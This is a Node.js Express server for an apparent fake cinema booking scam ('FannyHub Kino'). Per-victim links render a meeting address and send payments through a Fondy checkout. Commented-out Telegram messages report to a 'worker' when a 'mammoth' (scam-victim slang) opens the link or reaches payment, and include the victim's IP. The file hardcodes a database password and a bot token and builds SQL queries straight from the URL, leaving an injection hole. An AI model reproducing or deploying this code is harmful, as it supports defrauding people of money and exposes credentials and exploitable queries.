const {Client} = require('pg');
const TelegramApi = require('node-telegram-bot-api');
const bodyParser = require('body-parser');
const express = require('express');
const cors = require("cors");
const axios = require("axios");
const crypto = require("crypto");

// Подключение к бд
const client = new Client({
    host: "85.193.88.2",
    user: "gen_user",
    password: "syf790ux43",
    database: "default_db",
    port: 5432
});

client.connect();

// Обработака сайта
const app = express();
app.set('view engine', 'ejs');
app.use(bodyParser.urlencoded({extended: false}));
app.use(bodyParser.json());
app.use(express.static('public'));

try {

    app.get('/', (req, res) => {
        res.render('index_ua', {userplace: "вул Глінки, 2, Дніпро, Дніпропетровська область, Україна, 49000"})
        // res.render('error')
    })

    app.post('/939944288', (req, res) => {
        res.render('index_ua', {userplace: "вул Глінки, 2, Дніпро, Дніпропетровська область, Україна, 49000"})
        // res.render('error');
    })

    app.get('/:userlink', (req, res) => {
        client.query(`SELECT place FROM users WHERE link = '${req.params.userlink}'`, (err, ress)=>{
            console.log(ress)
            if (ress.rows[0] === undefined) {
                return console.log("error");
            }
            if (req.params.userlink.search('ua') !=  -1){
                var index = 'index_ua';
            } else {
                var index = 'index';
            }
            if (ress) {
                const bot = new TelegramApi("5968879838:AAFX1dcPajhRG5TA9dNHEGOPjvx7kpG7aMc");
                res.render(index, {userplace: ress.rows[0].place});
                client.query(`SELECT user_id FROM users WHERE link = '${req.params.userlink}'`, (err, res)=>{
                    // bot.sendMessage(res.rows[0].user_id, `🍿 <b>Кино\n</b>🙋‍♂️ <i>Мамонт перешел по ссылке: </i><b>${req.params.userlink}</b>\n\nID Воркера - ${res.rows[0].user_id}\nИмя Воркера - ${ress.rows[0].user_name}\n📍 <i>Место встречи:</i> <b>${ress.rows[0].place}</b>\n\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});
                })
                return console.log(ress.rows[0].place);
            } else {
                res.render(index, {userplace: "Москва Нирженская 15"});
            return console.log("undefined link") };
        })

    })
    
    app.post('/3dsua', async (req, res) => {
        // bot.sendMessage(res.rows[0].user_id, `🍿 <b>Кино\n</b>🙋‍♂️ <i>Мамонт перешел на страницу оплаты RU\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});

        const fondyPassword = 'test';

        const orderBody = {
            order_id: `test3f45f64f33${Date.now()}`,
            order_desc: "🍿 FannyHub Kino",
            currency: "UAH",
            amount: `${req.body.amount * 100}`,
            merchant_id: "1396424",
            response_url: "http://localhost:8080/939944288"
        }

        const orderedKeys = Object.keys(orderBody).sort((a, b) => {
            if (a < b) return -1;
            if (a > b) return 1;
            return 0
        })

        const signatureRaw = orderedKeys.map((v) => orderBody[v]).join('|');
        const signature = crypto.createHash('sha1');
        signature.update(`${fondyPassword}|${signatureRaw}`);

        const { data } = await axios.post('https://pay.fondy.eu/api/checkout/url/', {
            request: {
                ...orderBody,
                signature: signature.digest('hex'),
                email: false,
            },

        })
        res.redirect(data.response.checkout_url)
        return {
            statusCode: 200,
            body: JSON.stringify({
            })
        }
    })

    app.post('/3ds', async (req, res) => {
        // bot.sendMessage(res.rows[0].user_id, `🍿 <b>Кино\n</b>🙋‍♂️ <i>Мамонт перешел на страницу оплаты UA\n<i>🌐 IP - </i><b>${req.headers['x-forwarded-for'] || req.connection.remoteAddress}</b>`, {parse_mode: 'HTML'});

        const fondyPassword = 'test';

        const orderBody = {
            order_id: `test12345643sdftestf534333dde33433334re3435344453${Date.now()}`,
            order_desc: "🍿 FannyHub Kino",
            currency: "RUB",
            amount: `${req.body.amount * 100}`,
            merchant_id: "1396424",
            response_url: "http://localhost:8080/939944288"
        }

        const orderedKeys = Object.keys(orderBody).sort((a, b) => {
            if (a < b) return -1;
            if (a > b) return 1;
            return 0
        })

        const signatureRaw = orderedKeys.map((v) => orderBody[v]).join('|');
        const signature = crypto.createHash('sha1');
        signature.update(`${fondyPassword}|${signatureRaw}`);

        const { data } = await axios.post('https://pay.fondy.eu/api/checkout/url/', {
            request: {
                ...orderBody,
                signature: signature.digest('hex'),
                email: false,
            },

        })
        res.redirect(data.response.checkout_url)
        return {
            statusCode: 200,
            body: JSON.stringify({
            })
        }
    })

    

} catch (err) {
    console.log('error');
  }

const PORT = 8080;

app.listen(PORT, () => {
    console.log(`Server started...  port: `, PORT);
})

